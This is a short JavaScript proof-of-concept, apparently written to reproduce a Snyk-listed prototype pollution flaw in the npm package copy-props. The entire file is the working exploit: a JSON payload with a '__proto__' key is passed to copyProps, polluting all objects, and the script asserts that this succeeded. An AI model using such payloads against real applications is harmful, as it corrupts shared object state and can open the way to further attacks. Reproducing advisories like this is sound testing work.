//https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870

const copyProps = require('copy-props');
const assert = require('assert');

var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log("Before : " + {}.polluted);

copyProps(JSON.parse(malicious_payload), {});
console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");